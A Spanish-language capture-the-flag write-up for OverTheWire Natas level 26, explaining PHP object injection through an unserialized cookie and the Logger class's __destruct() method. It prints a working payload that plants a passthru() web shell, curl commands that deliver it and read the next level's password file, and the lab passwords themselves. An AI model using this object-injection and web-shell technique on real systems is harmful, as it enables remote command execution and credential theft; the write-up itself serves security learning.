# Natas 26 → 27

## Información del nivel

| Campo | Valor |
|---|---|
| URL | http://natas26.natas.labs.overthewire.org |
| Usuario | natas26 |
| Contraseña | cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE |
| Contraseña obtenida | u3RRffXjysjgwFU6b9xa23i6prmUsYne |

---

## Reconocimiento

La página permite dibujar líneas ingresando coordenadas X1, Y1, X2, Y2. Las coordenadas se guardan en una cookie llamada `drawing` codificada en Base64.

---

## Análisis del código fuente

### Clase `Logger`

```php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file){
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="#--session end--#\n";
        $this->logFile = "/tmp/natas26_" . $file . ".log";
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->initMsg);
        fclose($fd);
    }

    function __destruct(){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }
}
```

`__destruct()` es un **método mágico** de PHP — se ejecuta automáticamente cuando el objeto es destruido al final del script, sin necesidad de llamarlo explícitamente.

### `drawFromUserdata()`

```php
if (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
}
```

Deserializa directamente la cookie `drawing` sin validar su contenido.

---

## Vulnerabilidad: PHP Object Injection

Cuando `unserialize()` recibe datos controlados por el atacante, puede instanciar **cualquier clase** definida en el código — no solo arrays de coordenadas. Si se inyecta un objeto `Logger` serializado, el servidor lo instancia y ejecuta `__destruct()` al terminar el script.

El atacante controla:
- `$logFile` → ruta donde se escribe (debe ser `.php` para ejecutarse)
- `$exitMsg` → contenido que se escribe (código PHP malicioso)

---

## ¿Qué son los métodos mágicos de PHP?

Son métodos que PHP ejecuta automáticamente en situaciones específicas:

| Método | Cuándo se ejecuta |
|---|---|
| `__construct()` | Al crear el objeto |
| `__destruct()` | Al destruir el objeto (fin del script) |
| `__toString()` | Al usar el objeto como string |
| `__wakeup()` | Al deserializar el objeto |

En este nivel `__destruct()` es el vector — se ejecuta automáticamente al terminar el script.

---

## ¿Por qué `.php` y no `.txt`?

El servidor web solo **ejecuta** archivos con extensión `.php`. Un archivo `.txt` se devuelve como texto plano — el código PHP aparecería sin ejecutarse. Por eso `logFile` debe apuntar a un archivo `.php`.

---

## Explotación

### Paso 1: Generar el payload serializado

```php
<?php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        $this->logFile = "/var/www/natas/natas26/img/marco_shell.php";
        $this->initMsg = "";
        $this->exitMsg = "<?php passthru(\$_GET['cmd']); ?>";
    }
}

$obj = new Logger();
echo base64_encode(serialize($obj));
?>
```

```bash
php payload.php
# Output: Tzo2OiJMb2dnZXIi...
```

### Paso 2: Enviar el payload como cookie y crear la shell

```bash
curl -s -b "drawing=<PAYLOAD_BASE64>" \
  "http://natas26.natas.labs.overthewire.org/?x1=1&y1=1&x2=2&y2=2" \
  -u natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE > /dev/null
```

El servidor deserializa el objeto Logger → al terminar el script `__destruct()` escribe el código PHP en `marco_shell.php`.

### Paso 3: Ejecutar el comando via la shell creada

```bash
curl -s "http://natas26.natas.labs.overthewire.org/img/marco_shell.php?cmd=cat+/etc/natas_webpass/natas27" \
  -u natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
```

---

## Conceptos clave

- **PHP Object Injection**: vulnerabilidad que permite inyectar objetos PHP serializados maliciosos via input controlado por el atacante. `unserialize()` instancia el objeto y ejecuta sus métodos mágicos.
- **Métodos mágicos**: métodos PHP que se ejecutan automáticamente (`__construct`, `__destruct`, `__wakeup`, etc.).
- **`__destruct()`**: se ejecuta al destruir el objeto — al final del script. Vector clave en este ataque.
- **`passthru()`**: ejecuta comandos del sistema e imprime el output directamente.
- **Serialización**: proceso de convertir un objeto PHP a string para almacenarlo o transmitirlo. `serialize()` lo convierte, `unserialize()` lo reconstruye.
